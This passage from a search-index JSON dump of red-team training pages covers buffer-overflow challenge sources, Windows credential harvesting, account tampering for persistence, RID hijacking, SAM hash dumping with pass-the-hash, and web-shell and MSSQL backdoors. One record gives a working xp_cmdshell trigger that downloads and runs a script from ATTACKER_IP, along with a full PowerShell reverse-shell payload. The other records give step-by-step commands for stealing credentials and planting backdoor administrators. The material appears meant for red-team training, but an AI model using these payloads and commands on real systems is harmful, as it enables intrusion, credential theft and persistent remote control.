( prefix ))) # Trail padding buffer += \" \\r\\n \" s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) try : s . connect (( ip , port )) print ( \"[+] Sending evil buffer of {} bytes...\" . format (( len ( buffer ) - len ( prefix ) - 2 ))) s . send ( bytes ( buffer , \"latin-1\" )) print ( \"[+] Done!\" ) except socket . error : print ( \"[-] Could not connect.\" ) finally : s . close ()",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e24416fc8e4d495a49bdcb04ba19e064",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-64-heap-basic1",
    "t": "ELF x64: Basic heap overflow ",
    "c": "ELF x64: Basic heap overflow  RootMe challenge: ELF x64 - Basic heap overflow : heap heap heap hooray Environment configuration: PIE Position Independent Executable Yes RelRO Read Only relocations Yes NX Non-Executable Stack Yes Heap exec Non-Executable Heap Yes ASLR Address Space Layout Randomization Yes SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> void checkArg(const char *a) { while (*a) { if ( (*a == ';') || (*a == '&') || (*a == '|') || (*a == ',') || (*a == '$') || (*a == '(') || (*a == ')') || (*a == '{') || (*a == '}') || (*a == '`') || (*a == '>') || (*a == '<') ) { puts(\"Forbidden !!!\"); exit(2); } a++; } } int main() { char *arg = malloc(0x20); char *cmd = malloc(0x400); setreuid(geteuid(), geteuid()); strcpy(cmd, \"/bin/ls -l \"); printf(\"Enter directory you want to display : \"); gets(arg); checkArg(arg); strcat(cmd, arg); system(cmd); return 0; }",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c6d6fbde63078e1243548799d774cf15",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-remote-string",
    "t": "ELF x86: Remote format string bug ",
    "c": "ELF x86: Remote format string bug  root-me challenge : See the power of format string! Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack No Heap exec Non-Executable Heap No ASLR Address Space Layout Randomization No SF Source Fortification No SRC Source code access Yes Source code: #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/socket.h> #include <sys/types.h> #include <sys/wait.h> #include <arpa/inet.h> #include <unistd.h> #define LISTEN_PORT 56032 #define LENGTH 1024 /* gcc -m32 -o ch32 ch32.c -z execstack */ extern char **environ; int ssock; int recv_loop(void) { int csock; struct sockaddr_in caddr; socklen_t clen = sizeof(caddr); char input[LENGTH]; char output[LENGTH]; while(1) { if( (csock = accept(ssock, (struct sockaddr *) &caddr, &clen)) < 0) { perror(\"accept()\"); exit(1); } memset(input, '\\0', LENGTH); memset(output, '\\0', LENGTH); recv(csock, input, LENGTH-1, 0); snprintf (output, sizeof (output), input); output[sizeof (output) - 1] = '\\0'; send(csock, output, LENGTH-1, 0); close(csock); } return 0; } int main(void) { int i, pid, yes = 1; struct sockaddr_in saddr; for(i=0; environ[i] != NULL; i++) { memset(environ[i], '\\0', strlen(environ[i])); } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = htonl(INADDR_ANY); saddr.sin_port = htons(LISTEN_PORT); while(1) { pid = fork(); if( pid == 0 ) { printf(\"run (pid=%d)\\n\", getpid()); if( (ssock = socket(PF_INET, SOCK_STREAM, 0)) < 0) { perror(\"socket()\"); exit(1); } if(setsockopt(ssock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) <0) { perror(\"setsockopt()\"); exit(1); } if( bind(ssock, (struct sockaddr*) &saddr, sizeof(saddr)) < 0) { perror(\"bind()\"); exit(1); } if( listen(ssock, 5) < 0) { perror(\"listen()\"); exit(1); } recv_loop(); } else { wait(NULL); close(ssock); } } return 0; } Resources  Chaine de format - exploitation PHRACK - Advances in format string exploitation DEFCON 18 Advanced Format String Attacks Format String and Double-Free Attacks Les failles Format String",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2ca8061c07af59a719eff4f7b8f7f3a5",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-free-basic",
    "t": "ELF x86: Use after free basic ",
    "c": "ELF x86: Use after free basic  root-me challenge : Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations Yes NX Non-Executable Stack Yes Heap exec Non-Executable Heap Yes ASLR Address Space Layout Randomization Yes SRC Source code access Yes Source code: #include <stdlib.h> #include <stdio.h> #include <string.h> #include <unistd.h> #define BUFLEN 64 struct Dog { char name[12]; void (*bark)(); void (*bringBackTheFlag)(); void (*death)(struct Dog*); }; struct DogHouse{ char address[16]; char name[8]; }; int eraseNl(char* line){ for(;*line != '\\n'; line++); *line = 0; return 0; } void bark(){ int i; for(i = 3; i > 0; i--){ puts(\"UAF!!!\"); sleep(1); } } void bringBackTheFlag(){ char flag[32]; FILE* flagFile = fopen(\".passwd\",\"r\"); if(flagFile == NULL) { puts(\"fopen error\"); exit(1); } fread(flag, 1, 32, flagFile); flag[20] = 0; fclose(flagFile); puts(flag); } void death(struct Dog* dog){ printf(\"%s run under a car... %s 0-1 car\\n\", dog->name, dog->name); free(dog); } struct Dog* newDog(char* name){ printf(\"You buy a new dog. %s is a good name for him\\n\", name); struct Dog* dog = malloc(sizeof(struct Dog)); strncpy(dog->name, name, 12); dog->bark = bark; dog->bringBackTheFlag = bringBackTheFlag; dog->death = death; return dog; } void attachDog(struct DogHouse* dogHouse, struct Dog* dog){ printf(\"%s lives in %s.\\n\", dog->name, dogHouse->address); } void destruct(struct DogHouse* dogHouse){ if(dogHouse){ puts(\"You break the dog house.\"); free(dogHouse); } else puts(\"You do not have a dog house.\"); } struct DogHouse* newDogHouse(){ char line[BUFLEN] = {0}; struct DogHouse* dogHouse = malloc(sizeof(struct DogHouse)); puts(\"Where do you build it?\"); fgets(line, BUFLEN, stdin); eraseNl(line); strncpy(dogHouse->address, line, 16); puts(\"How do you name it?\"); fgets(line, 64, stdin); eraseNl(line); strncpy(dogHouse->name, line, 8); puts(\"You build a new dog house.\"); return dogHouse; } int main(){ int end = 0; char order = -1; char nl = -1; char line[BUFLEN] = {0}; struct Dog* dog = NULL; struct DogHouse* dogHouse = NULL; while(!end){ puts(\"1: Buy a dog\\n2: Make him bark\\n3: Bring me the flag\\n4: Watch his death\\n5: Build dog house\\n6: Give dog house to your dog\\n7: Break dog house\\n0: Quit\"); order = getc(stdin); nl = getc(stdin); if(nl != '\\n'){ exit(0); } fseek(stdin,0,SEEK_END); switch(order){ case '1': puts(\"How do you name him?\"); fgets(line, BUFLEN, stdin); eraseNl(line); dog = newDog(line); break; case '2': if(!dog){ puts(\"You do not have a dog.\"); break; } dog->bark(); break; case '3': if(!dog){ puts(\"You do not have a dog.\"); break; } printf(\"Bring me the flag %s!!!\\n\", dog->name); sleep(2); printf(\"%s prefers to bark...\\n\", dog->name); dog->bark(); break; case '4': if(!dog){ puts(\"You do not have a dog.\"); break; } dog->death(dog); break; case '5': dogHouse = newDogHouse(); break; case '6': if(!dog){ puts(\"You do not have a dog.\"); break; } if(!dogHouse){ puts(\"You do not have a dog house.\"); break; } attachDog(dogHouse, dog); break; case '7': if(!dogHouse){ puts(\"You do not have a dog house.\"); break; } destruct(dogHouse); break; case '0': default: end = 1; } } return 0; } Resources  Blackhat EU-16 - Use-After-Use-After-Free - Exploit UAF by generating your own - Guanxing Wen From collision to exploitation: Unleashing Use-After-Free vulnerabilities in Linux Kernel",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "17e91e97f514a45a939a7e0b7a7cebcf",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-stack-cpp",
    "t": "ELF x86: Stack buffer overflow C++ vtables ",
    "c": "ELF x86: Stack buffer overflow C++ vtables  root-me challenge : Buffer overflow on C++ vtables. Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations Yes NX Non-Executable Stack No ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection Yes SRC Source code access Yes Source code: #include <stdlib.h> #include <stdio.h> #include <string.h> #include <ctype.h> #include <stdio.h> class formatter { public : virtual int RTTI( ) =0 ; virtual void displayName( ) =0 ; virtual void format( const char * ptr ) =0 ; }; class UpperFormatter: public formatter { public : virtual int RTTI( ) { return 1; }; virtual void displayName( ) { printf (\"UpperFormatter\"); } virtual void format( const char * ptr ) { const char * cptr = ptr; while (*cptr) { printf(\"%c\", toupper(*cptr)); cptr++; } } }; class LowerFormatter: public formatter { public : virtual int RTTI( ) { return 2; }; virtual void displayName( ) { printf (\"UpperFormatter\"); } virtual void format( const char * ptr ) { const char * cptr = ptr; while (*cptr) { printf(\"%c\", tolower(*cptr)); cptr++; } } }; #define SIZE (80) class MyStringFormatter { public: MyStringFormatter( formatter * pFormatter ):m_pFormatter(pFormatter),m_Id(1) {}; void GetInput(int padding ) { memset(str ,' ' , SIZE ); fgets(str+padding,SIZE,stdin); } void display() const{m_pFormatter->format(str) ;} protected: char str[SIZE]; formatter * m_pFormatter ; int m_Id; }; int main(int argc, char* argv[]) { printf(\"Padding : 1-5\\r\\n\"); char size[4]; int padding = atoi(fgets(size,4,stdin)); if (padding <0 || padding >5) { printf (\"Padding error\\r\\n\"); exit(0); } printf(\"\\r\\n\\r\\n\\tConvert in : \\r\\n\"); printf(\"\\t 1: uppercase \\r\\n\"); printf(\"\\t 2: lowercase \\r\\n\"); int choice = atoi(fgets(size,4,stdin)); formatter * pformatter = NULL; switch (choice) { case 1: pformatter = new UpperFormatter ; break; case 2: pformatter = new LowerFormatter ; break; } if (pformatter == NULL) { printf (\"Bad choice!\\r\\n\"); exit(0); } MyStringFormatter formatter(pformatter ); printf(\"String to convert: \\r\\n\"); formatter.GetInput(padding); formatter.display(); return 0; } Resources  Phrack - Smashing C++ vptrs in vtables",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "049105cf968a50de3e0898638f248af1",
    "u": "https://bof.tymyrddin.dev/docs/notes/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Buffer overflow attacks are code injection techniques that exploit an application’s vulnerabilities to take control of execution flow. These attacks take advantage of programming errors that allow malicious input to overwrite parts of memory, resulting in unintended or malicious code execution. Why?  Buffer overflows are a common type of security vulnerability, particularly in legacy code or code not written with security in mind. They can be challenging to detect and exploit, but once successfully exploited, make complete control over the vulnerable system possible. Buffer overflows are one of the most common attacks used by malware and viruses to infect systems. How?  Stack operations and function-calling Linux x86 exploits",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b8bc8703fb42f3f7d6d9490d4bff683a",
    "u": "https://fire.tymyrddin.dev/",
    "t": "Forest fire ",
    "c": "Forest fire  Red Teaming is the process of using Tactics, Techniques, and Procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of the people, processes, and technology used to defend an environment. Intel-driven Introduction TIBER-EU MITRE ATT&CK OST Map Opsec Introduction Identify critical information Analyse threats Analyse vulnerabilities Assess risks Apply appropriate countermeasures Hide your tracks Preparation Introduction Falconry (in \"In\") Lay of the land (in \"In\") Weaponisation Introduction Gain unauthorised access Windows Scripting Host (WSH) HTML Application (HTA) Visual Basic for Application (VBA) Powershell Getting out of the box (BeEF) Command and control (C2) Attack infrastructure as code (in \"In\") Delivery techniques Create a botnet SEO poisoning Password attacks Introduction Password profiling Brute-force and dictionary attacks Password spraying Hash cracking Phishing Introduction Phishing overview Mail delivery Steal access info with fake login page Webpage with BeEF hook Use analytics to lure a target Fake prompts everywhere Pharming overview Credential stuffing Enumeration Introduction Passive scanning Linux Windows Running services DNS SMB SNMP More Windows tools Escalation Introduction Windows escalation tools Reuseful escalation patterns Harvesting passwords Quick misconfiguration wins Abusing service misconfigurations Abusing dangerous privileges Abusing vulnerable software Persistence Introduction Tampering with unprivileged accounts Backdooring files Abusing services Abusing scheduled tasks Logon triggered persistence Backdooring the login screen/RDP Persisting through existing services Lateral movement and pivoting Introduction Mythical blue lake Data exfiltration Introduction Data exfiltration (in \"Out\")",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "67afc42ef417d93fbd56fff8cac06633",
    "u": "https://fire.tymyrddin.dev/docs/opsec/risks",
    "t": "Assess risks ",
    "c": "Assess risks  In OPSEC, risk assessment requires learning the possibility of an event taking place along with the expected cost of that event. Thus, this involves assessing the adversary’s ability to exploit the vulnerabilities. Once the level of risk is determined, countermeasures can be considered to mitigate that risk: The efficiency of the countermeasure in reducing the risk. The cost of the countermeasure compared to the impact of the vulnerability being exploited. The possibility that the countermeasure can reveal information to the adversary. Example: We can expect that a SIEM would make it reasonably uncomplicated to detect suspicious activity and connect three events such as scanning with Nmap, sending various phishing emails, and using the Metasploit framework from the same machine. The related risk is high. But if we know that the adversary has minimal resources for detecting security events, we can assess the risk related to this vulnerability as low.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0f46855c015aa9cc63a6227f7663ca3f",
    "u": "https://fire.tymyrddin.dev/docs/escalation/tools",
    "t": "Windows escalation tools ",
    "c": "Windows escalation tools  WinPEAS enumerates a target system to uncover privilege escalation paths. You can also download the precompiled executable or a .bat script. The output can be lengthy and sometimes difficult to read. It is recommended to always redirect the output to a file. PrivescCheck is a PowerShell script that searches for common privilege escalations on a target system. It is an alternative to WinPEAS without having to execute a binary file. It may be necessary to bypass execution policy restrictions with the Set-ExecutionPolicy cmdlet. Windows Exploit Suggester - Next Generation (WES-NG) will run on the attack machine, making way less noise. You run the systeminfo command on the target system, directing the output to a .txt file that you will need to move to your attacking machine. Before using it, update the database with # python -m wes.py --update , then use it on the downloaded .txt file: # wes.py systeminfo.txt",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b2d2876e39730b504b09aebc000696cf",
    "u": "https://fire.tymyrddin.dev/docs/recon/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Discovering subdomains related to the target organisation Gathering publicly available information about a host and IP addresses Finding email addresses related to the target Discovering login credentials and leaked passwords Locating leaked documents and spreadsheets Why?  In a red team operation, we might start with no more than a company name, from which we need to start gathering information about the target. The more we know about our target’s infrastructure and people, the better we can orchestrate our attacks. How?  Use from these, but choose wisely: be quiet, keep the noise down. Falconry (in “In”) Lay of the land (in “In”)",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6e2cf7ccd9b256ab1b847bff37fd1997",
    "u": "https://fire.tymyrddin.dev/docs/escalation/passwords",
    "t": "Harvesting passwords ",
    "c": "Harvesting passwords  Attack tree  1 Escalate using found credentials in 1.1 Unattended Windows installations 1.2 Powershell history 1.3 Saved Windows credentials 1.4 IIS configuration 1.5 Retrieve credentials from software, for example PuTTY Examples  Unattended Windows installations  When installing Windows on a large number of hosts, administrators often use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These unattended installations do not require user interaction. They do require the use of an administrator account for the initial setup, which might end up being stored in the machine in the following locations: C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml Powershell history  Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved In the cmd.exe prompt: type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt In the Powershell prompt: type $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt Saved Windows credentials  Windows allows for the use of other users’ credentials. To list saved credentials: cmdkey /list Passwords are not given, but a possibly interesting credential can be used with the runas command and the /savecred option: runas /savecred /user:admin cmd.exe IIS configuration  Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in the web.config file and can store passwords for databases or configured authentication mechanisms. Depending on the version of IIS, it can be found in: C:\\inetpub\\wwwroot\\web.config C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config To find database connection strings on the file: type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString Retrieve credentials from PuTTY  To retrieve the stored proxy credentials, search under the following registry key for ProxyPassword with: reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s Simon Tatham is the creator of PuTTY (and his name is part of the path), and is not the username. Keep command as is. Notes  The example for retrieving credentials from software here is PuTTY. but any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "499d6eb4af4b903ffcf0e969efd2d678",
    "u": "https://fire.tymyrddin.dev/docs/weapons/unauthorised-access",
    "t": "Gain unauthorised access ",
    "c": "Gain unauthorised access  Attack tree  1 Gain credentials of an authorised user in a vulnerable physical context (OR) 1.1 Ask for a temporary use of password from an already authorised user (OR) 1.2 Cooperate with an already authorised user to receive credentials (OR) 1.3 Fool an authorised user to leak credentials (OR) 1.4 Shoulder surfing (OR) 1.5 Install and use keylogger (OR) 1.6 Implant other malware for further remote intrusions (OR) 1.7 Use an unattended logged-in machine (OR) 1.8 Steal devices containing credentials of authorised users (OR) 1.9 Steal devices or storage containing the information 2 Gain access to the data stored in databases (OR) 2.1 Using an SQL injection (OR) 2.2 Using known database exploits 3 Capture authorised user credentials via vulnerable web application (OR) 3.1 Exploit file upload vulnerabilities (OR) 3.2 Exploit remote code execution vulnerabilities (OR) 3.3 Cross site scripting (XSS) (OR) 3.4 Manipulating cookies (OR) 3.5 Clickjacking (OR) 3.6 Cross-Site Request Forgery (CSRF) 4 Gain access to webserver 4.1 Hijacking session 5 Social engineering for delivering malware (OR) 5.1 Email spoofing (OR) 5.2 Steal access info with fake login page (OR) 5.3 (Fake) Webpage with a hook (OR) 5.4 SEO poisoning (OR) 5.5 All kinds of creative ways to lure people 6 Password-based attacks on applications, databases, user accounts (OR) 6.1 Publicly available information (OR) 6.1.1 Reconnaissance for guessing user names (AND) 6.1.2 Crack password 6.1.2.1 Brute-force password (OR) 6.1.3.2 Dictionary attack 7 Steal credentials via vulnerable network 7.1 Network reconnaissance (AND) 7.1.1 Find where the resources are logically located (AND) 7.1.2 Scan the network for alive hosts (AND) 7.1.3 Probe ports to discover services (AND) 7.1.4 Know, learn or research the vulnerabilities of OSs and the applications they run 7.2 Exploit vulnerability (AND) 7.3 Vulnerable host (OR) 7.3.1 Compromise server (AND) 7.3.2 Retrieve password files 7.3.2.1 View unencrypted password files (OR) 7.3.2.2 Decrypt password files 7.4 Sniff network management traffic (AND) 7.5 Capture password from router configuration (OR) 7.5.1 Compromise router (AND) 7.5.1.1 View unencrypted router configuration (OR) 7.5.1.2 Decrypt encrypted router configuration 7.6 Intercept or modify data with a MitM attack 8 Discover implementation flaw in (access control) protocol 9 Discover new attack (vector) Notes  Use, disclosure, alteration, and destruction of information, including gaining access to the network to gain access to the information and/or gaining access to the building with the devices the information resides on. In the context of network attacks, the first objective of an adversary is to gain initial access, so additional reconnaissance can be done to scout out resources, IP addresses, and perhaps even a network discovery (mapping) program or a sniffer-type packet-capturing utility, to capture administrative-level passwords.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0cc694c320718873ff61ee35b98347f4",
    "u": "https://fire.tymyrddin.dev/docs/weapons/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Weaponisation is the second stage of the Cyber Kill Chain model. Use our own crafted tools to exploit a target. Why?  Most organisations have Windows OS running, which is going to be a likely target. An organisation’s environment policy often blocks downloading and executing .exe files to avoid security violations. Red teams rely on building custom payloads sent via other channels such as phishing campaigns, social engineering, browser or software exploitation, USB, or web methods. How?  Gain unauthorised access Windows scripting host HTML application Visual Basic for application Powershell Getting out of the box (BeEF) Command and control Attack infrastructure as code (in “In”) Delivery techniques Create a botnet SEO poisoning The Art of Cyberwarfare, Himanshu Sharma , Harpreet Singh, 2018",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "62a659f8ff8c8528921d45f18abaeb34",
    "u": "https://fire.tymyrddin.dev/docs/persistence/tampering",
    "t": "Tampering with unprivileged accounts ",
    "c": "Tampering with unprivileged accounts  Having administrator credentials is the easiest way to achieve persistence. And to make it harder for the blue team to detect us, we can manipulate unprivileged user accounts, which will most likely not be monitored as much as administratoraccounts, and grant those administrative privileges. Assign group memberships  Assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use. The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group: net localgroup administrators <username> /add This will allow username to access the server by using RDP, WinRM or any other remote administration service available. Alternatively, use the Backup Operators group. Users in this group will not have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow for copying the content of the SAM and SYSTEM registry hives, which can be uses to recover password hashes for all the users, enabling escalation to any administrative account. net localgroup \"Backup Operators\" <username> /add Such an account cannot RDP or WinRM back into the machine unless it is added it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups: net localgroup \"Remote Management Users\" <username> /add And, LocalAccountTokenFilterPolicy strips any local account of its administrative privileges when logging in remotely. While being able to elevate privileges through UAC from a graphical user session, when using WinRM, the account is confined to a limited access token with no administrative privileges. To regain administration privileges for the account, disable LocalAccountTokenFilterPolicy by changing this registry key to 1: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 To check the backdoor user is working, establish a WinRM connection and check that the Backup Operators group is enabled the username account. evil-winrm -i <IP target> -u <username> -p <password> Make a backup of SAM and SYSTEM files and download: *Evil-WinRM* PS C:\\> reg save hklm\\system system.bak The operation completed successfully. *Evil-WinRM* PS C:\\> reg save hklm\\sam sam.bak The operation completed successfully. *Evil-WinRM* PS C:\\> download system.bak Info: Download successful! *Evil-WinRM* PS C:\\> download sam.bak Info: Download successful! Dump the password hashes for all users using for example, secretsdump.py from impacket or another similar tool: impacket-secretsdump -sam sam.bak -system system.bak local Pass-the-Hash to connect to the target machine with Administrator privileges: evil-winrm -i <IP target> -u Administrator -H <hash> Special privileges and security descriptors  Privileges are the capacity to do a task on the system, like having the capabilities to shut down the server or being able to take ownership of any file on the system. Such privileges can be assigned to any user, regardless of group memberships. Export the current configuration to a temporary file: secedit /export /cfg config.inf Open the file: Add username at the end of the lines for SeBackupPrivilege and SeRestorePrivilege Convert the .inf file into a .sdb file and use it to load the configuration back into the system: secedit /import /cfg config.inf /db config.sdb secedit /configure /db config.sdb /cfg config.inf username now has equivalent privileges to any Backup Operator, but can not log into the system via WinRM . Instead of adding the user to the Remote Management Users group, change the security descriptor associated with the WinRM service to allow username to connect. Open the configuration window for changing WinRM security descriptor: Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI This will open a window: Add username and assign full privileges to connect to WinRM Now username can connect via WinRM and having SeBackup and SeRestore privileges, and after changing the LocalAccountTokenFilterPolicy registry key, can do the steps to recover the password hashes from the SAM and connect back with the Administrator user. Advantage of this method over group membership assignment is that username will look like a regular user when groups are checked. Nothing to see here. RID hijacking  When a user is created, an identifier called Relative ID ( RID ) is assigned to the user. This RID is a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets the associated RID from the SAM registry hive and creates an access token associated with that RID . If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts. In any Windows system, the default Administrator account is assigned the RID = 500 , and regular users usually have a RID >= 1000 . To find the assigned RIDs for any user: wmic useraccount get name,sid The SID is an identifier that allows the operating system to identify a user across a domain. The last number group is the RID . To assign a RID=500 to username , access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, not even Administrators can edit it. To run Regedit as SYSTEM , use psexec , available in C:\\tools\\pstools : C:\\tools\\pstools> PsExec64.exe -i -s regedit In Regedit, go to HKLM\\SAM\\SAM\\Domains\\Account\\Users\\ where there will be a key for each user in the machine. To modify username , search for a key with its RID in hex . Under the corresponding key, there will be a value called F , which holds the user’s effective RID at position 0x30: Replace RID The RID is stored using little-endian notation, so its bytes appear reversed. Replace those two bytes with the RID of Administrator in hex (500 = 0x01F4 ), and switching around the bytes = F401 . The next time username logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1926a5a38eee059fe4da56f5bdb7dca6",
    "u": "https://fire.tymyrddin.dev/docs/persistence/existing",
    "t": "Persisting through existing services ",
    "c": "Persisting through existing services  Any application where you have some degree of control on what gets executed can be backdoored in a similar way. The possibilities are endless! Using web shells  Download a web shell like ASP.NET web shell . Transfer it to the target machine and move it into the webroot, which for IIS by default is the C:\\inetpub\\wwwroot directory. move shell.aspx C:\\inetpub\\wwwroot\\ We can then run commands from the web server by going to the following URL: http://<IP target>/shell.aspx Note: If you are getting a Permission Denied error while accessing the shell’s URL, just grant everyone full permissions on the file to get it working. You can do so with icacls shell.aspx /grant Everyone:F Web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert. Using MSSQL as a backdoor  There are many ways to plant backdoors in MSSQL Server installations, one of which is abusing triggers. Triggers in MSSQL allow for bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. xp_cmdshell is a stored procedure provided by default in any MSSQL installation. It allows for running commands directly in the system’s console but comes disabled by default. To enable it, open Microsoft SQL Server Management Studio 18 , from the start menu. When asked for authentication, use Windows Authentication (the default value), and you will be logged on with the credentials of the current Windows User. By default, the local Administrator account will have access to all DBs. Once logged in, click on the New Query button to open the query editor: Run the following SQL sentences to enable the Advanced Options in the MSSQL configuration, and enable xp_cmdshell . sp_configure 'Show Advanced Options',1; RECONFIGURE; GO sp_configure 'xp_cmdshell',1; RECONFIGURE; GO Next up is making sure that any website accessing the database can run xp_cmdshell . By default, only database users with the sysadmin role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the sa user, which is the default database administrator: USE master GRANT IMPERSONATE ON LOGIN::sa to [Public]; Configuring a trigger starts by changing to the HRDB database: USE HRDB The trigger will leverage xp_cmdshell to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an INSERT is made into the Employees table of the HRDB database: CREATE TRIGGER [sql_backdoor] ON HRDB.dbo.Employees FOR INSERT AS EXECUTE AS LOGIN = 'sa' EXEC master..xp_cmdshell 'Powershell -c \"IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')\"'; Now that the backdoor is set up, let’s create evilscript.ps1 in our attacker’s machine, which will contain a Powershell reverse shell: $client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",4454); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() We will need to open two terminals to handle the connections involved in this exploit: The trigger will perform the first connection to download and execute evilscript.ps1 . Our trigger is using port 8000 for that. python -m http.server The second connection will be a reverse shell on port 4454 back to our attacker machine. nc -lvp 4454 Navigate to http://IP target/ and insert an employee into the web application.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "46bd27b2c4310b15a15cc7032ec6c41c",
    "u": "https://fire.tymyrddin.dev/docs/opsec/information",
    "t": "Identify critical information ",
    "c": "Identify critical information  To identify critical information, the red team needs to use an adversarial approach and ask themselves what information an adversary, the blue team in this case, would want to know about the mission. If obtained, the adversary will be in a solid position to thwart the red team’s attacks. Critical information is not necessarily sensitive information, but is any information that might jeopardise the red teams plans if leaked to an adversary. Examples: Client information that the team has learned. It is unacceptable to share client specific information such as people’s names, roles, and infrastructure that the team has discovered. Sharing this type of information should be kept on need-to-know basis as it could compromise the integrity of the operation. The Principle of Least Privilege (PoLP) dictates that any entity (user or process) must be able to access only the information necessary to carry out its task. PoLP should be applied in every step taken by the Red Team. Red team information, such as identities, activities, plans, capabilities and limitations. The adversary can use such information to be better prepared to face the attacks. Tactics, Techniques, and Procedures (TTP) that the team uses in order to emulate an attack. OS, cloud hosting provider, or C2 framework used by the team. If the team uses Pentoo for penetration testing, and the defender knows this, they can keep an eye for logs exposing the OS as Pentoo. Depending on the target, there is a possibility that other attackers are also using Pentoo to launch their attacks; but, there is no reason to expose the OS if you do not have to. Public IP addresses that the red team will use. If the blue team gains access to this kind of information, they could quickly mitigate the attack by blocking all inbound and outbound traffic to these IP addresses. Domain names that the team has registered. Domain names play a significant role in attacks such as phishing. If the blue team figures out the domain names the team will be using to launch their attacks, they could block or sinkhole the domains to neutralise the attack. Hosted websites, such as phishing websites, for adversary emulation.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4702f7ea158216bf046074279a156b7b",
    "u": "https://fire.tymyrddin.dev/docs/phishing/pharming",
    "t": "Pharming overview ",
